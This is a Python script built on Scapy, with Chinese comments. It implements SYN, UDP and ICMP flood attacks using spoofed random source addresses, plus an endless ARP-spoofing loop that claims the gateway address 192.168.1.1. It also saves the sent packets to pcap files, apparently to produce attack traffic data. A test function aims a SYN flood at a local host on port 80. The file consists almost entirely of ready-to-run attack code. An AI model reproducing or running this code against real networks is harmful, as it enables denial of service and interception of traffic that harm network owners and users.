from scapy.all import *
import random
from scapy.utils import PcapWriter
from scapy.layers.inet import IP, UDP, TCP

class NetAttackType():
    SYNFlood = 'a1'
    UDPFlood = 'a2'
    ICMPFlood = 'a3'
    ARPCheat = 'a4'


class ScapyAttack():
    def __init__(self):
        self.ipAddr = ''
        self.port = None  # 需要使用int类型
        self.info = {}
        self.analyse = {}
        self.attacktype = ''
        self.pktpcap = ''

    def __SetIPAddr(self, ipAddr):
        self.ipAddr = ipAddr

    def __SetPort(self, port):
        self.port = port

    def AnalyseCommand(self, command):
        listcommand = command.split(' ')
        if len(listcommand) == 0:
            raise ValueError("Empty command!!!")
        elif len(listcommand) == 1:
            raise ValueError("IP not set!!!")
        else:
            type = listcommand[0]
            ip = listcommand[1]
        self.ipAddr = ip
        port = ''
        netattacktype = NetAttackType()
        if len(listcommand) == 3:
            port = listcommand[2]
            self.port = int(port)
        if (type == netattacktype.SYNFlood):
            if port == '':
                raise ValueError("Port not set!!!")
            self.attacktype = "SYNFlood"
            self.FloodAttack()
        elif (type == netattacktype.UDPFlood):
            if port == '':
                raise ValueError("Port not set!!!")
            self.attacktype = "UDPFlood"
            self.FloodAttack()
        elif (type == netattacktype.ICMPFlood):
            self.attacktype = "ICMPFlood"
            self.FloodAttack()
            if (port != ''):
                self.port = ''
        elif (type == netattacktype.ARPCheat):
            self.attacktype = "ARPCheat"
            self.ARPCheatAttack()

        else:
            raise ValueError("Unknown instruction!!!")
        return self.attacktype

    def ManualSet(self):
        self.__SetPort('')
        self.__SetIPAddr("192.168.1.203")

    def FloodAttack(self):
        pcapname = "../Data/RAW" + self.attacktype + '.pcap'
        self.pcapwriter = PcapWriter(pcapname, append=True, sync=True)
        # 源IP地址列表
        srcList = []
        # 源IP地址数量
        ipNum = 10
        # 一次发送数据包数量
        count = 1000
        # 源端口数目
        sportnum = 100
        packet = ''
        # 生成随机的IP地址，作为攻击源地址
        for i in range(ipNum):
            srcList.append(self.GenRandomIP())
        for i in range(sportnum):
            sPort = random.randint(1, 65535)
            # 随机选一个源IP
            index = random.randrange(ipNum)
            ipAddr = srcList[index]
            if self.attacktype == "SYNFlood":
                packet = self.SYNPacket(ipAddr, sPort)
            elif self.attacktype == "UDPFlood":
                packet = self.UDPPacket(ipAddr, sPort)
            elif self.attacktype == "ICMPFlood":
                packet = self.ICMPPacket(ipAddr)
            else:
                raise ValueError("Unknown Flood Attack!!!")
            # 发送
            pcappacket = send(packet, count=count, return_packets=True)
            self.pcapwriter.write(pcappacket)

    def SYNPacket(self, ipAddr, sPort):
        # 生成IP层，指定源IP和目的IP
        ipLayer = IP(src=ipAddr, dst=self.ipAddr)
        # 生成TCP层，指定源端口和目的端口，指定为SYN包
        tcpLayer = TCP(sport=sPort, dport=self.port, flags="S")
        # 将其拼接
        packet = ipLayer / tcpLayer
        return packet

    def UDPPacket(self, ipAddr, sPort):
        ipLayer = IP(src=ipAddr, dst=self.ipAddr)
        udpLayer = UDP(sport=sPort, dport=self.port)
        packet = ipLayer / udpLayer
        return packet

    def ICMPPacket(self, ipAddr):
        ipLayer = IP(src=ipAddr, dst=self.ipAddr)
        icmpLayer = ICMP()
        packet = ipLayer / icmpLayer
        return packet

    def ARPCheatAttack(self):
        pcapname = "../Data/Raw" + self.attacktype + '.pcap'
        self.pcapwriter = PcapWriter(pcapname, append=True, sync=True)
        count = 1000
        # 指定一个地址的mac绑定为本机mac
        while True:
            arpLayer = ARP(psrc="192.168.1.1", pdst=self.ipAddr)
            packet = arpLayer
            pcappacket = send(packet, count=count, return_packets=True)
            time.sleep(1)
        # self.pcapwriter.write(pcappacket)

    # 生成随机的IP地址值
    def GenRandomIP(self):
        # ip1 = random.randint(1, 255)
        ip1 = 250
        ip2 = random.randint(0, 255)
        ip3 = random.randint(0, 255)
        ip4 = random.randint(0, 255)
        ip = str(ip1) + '.' + str(ip2) + '.' + str(ip3) + '.' + str(ip4)
        return ip


def ScapyTest():
    test = ScapyAttack()
    test.AnalyseCommand("a1 192.168.1.173 80")


if __name__ == "__main__":
    ScapyTest()
